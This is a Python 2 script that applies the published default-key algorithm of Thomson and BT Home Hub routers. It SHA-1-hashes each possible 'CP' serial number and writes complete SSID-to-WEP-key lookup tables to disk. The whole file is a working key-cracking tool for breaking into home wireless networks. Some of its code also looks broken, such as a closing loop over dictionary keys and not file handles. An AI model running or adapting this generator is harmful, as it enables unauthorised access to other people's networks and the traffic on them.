#!/usr/bin/python
# http://209.85.135.104/search?q=cache:MGlJn9Cl2cwJ:www.networksecurityarchive.org/html/Vuln-Dev/2008-06/msg00303.html+mdap+network&hl=en&ct=clnk&cd=4&gl=uk&client=firefox-a
# http://www.gnucitizen.org/blog/default-key-algorithm-in-thomson-and-bt-home-hub-routers/

import sys
import sha

def genKeyFromSerial(serial):
	hash = sha.sha(serial).digest()

	ssid = hash[-3:]
	key = hash[:5]

	return (ssid, key)

def hex2bin(s):
	bin_string = ""
	for i in range(0, len(s), 2):
		byte = "%s%s" % (s[i], s[i+1])
		integer = int(byte, 16)
		char = chr(integer)
		bin_string += char
	return bin_string

def bin2hex(bs):
	s = ""
	for c in bs:
		s += "%02X" % ord(c)
	return s

if False:
	# Test cases
	test_list = [{"SERIAL": "CP0615313039", "SSID": "F8A3D0", "KEY": "742DA831D2"},
				 {"SERIAL": "CP064736444D", "SSID": "..8DF3", "KEY": "06F48A28EB"}]

	for test in test_list:
		print test["SERIAL"]
		bin_result = genKeyFromSerial(test["SERIAL"])
		hex_result = ""
		for char in bin_result:
			hex_result += "%02X" % ord(char)

		print " Expected: %s%s" % (test["SSID"], test["KEY"])
		print "      Got: %s" % hex_result

	sys.exit()

import locale, time
locale.setlocale(locale.LC_ALL, "")

list_a = range(0, 0xFFFF+1)
list_b = range(ord('0'), ord('9')+1)
list_b += range(ord('A'), ord('Z')+1)

list_a = [ "%04X" % x for x in list_a ]
list_b = [ "%02X" % x for x in list_b ]

totalcount = len(list_a) * len(list_b) * len(list_b) * len(list_b)
totalbytes = totalcount * (3 + 5)

print "Will generate %s SSID -> WEP-KEY combinations, requiring %s bytes of diskspace" % (
		locale.format("%d", totalcount, True),
		locale.format("%d", totalbytes, True)
		)

formatted_totalcount = locale.format("%d", totalcount, True)
totalcount = float( totalcount )

file_handles = {}
for i in range(0, 0xFF+1):
	file_handles[i] = file("keys/xxxx%02X" % i, "wb")

lastcount = 0
count = 0
timestamp = time.time()
for i in list_a:
	for j in list_b:
		for k in list_b:
			for l in list_b:
				serial = "CP" + i + j + k + l
				(ssid, key) = genKeyFromSerial(serial)
				file_handles[ord(ssid[2])].write(ssid+key)
				count += 1

	# Print status update
	if count - lastcount > 100000:
		newtimestamp = time.time()
		timedelta = newtimestamp - timestamp
		timestamp = newtimestamp

		countdelta = count - lastcount
		countrate = countdelta / timedelta

		countremain = totalcount - count
		timeremain = countremain / countrate

		mins, secs = divmod(int(timeremain), 60)
		hours, mins = divmod(mins, 60)
		htimeremain = '%02d:%02d:%02d' % (hours, mins, secs)

		percentage = 100*count / totalcount
		formatted_count = locale.format("%d", count, True)
		print "%0.3f%%: %s of %s records (ETA in %s)" % (percentage, formatted_count, formatted_totalcount, htimeremain)
		lastcount = count

[ f.close() for f in file_handles ]
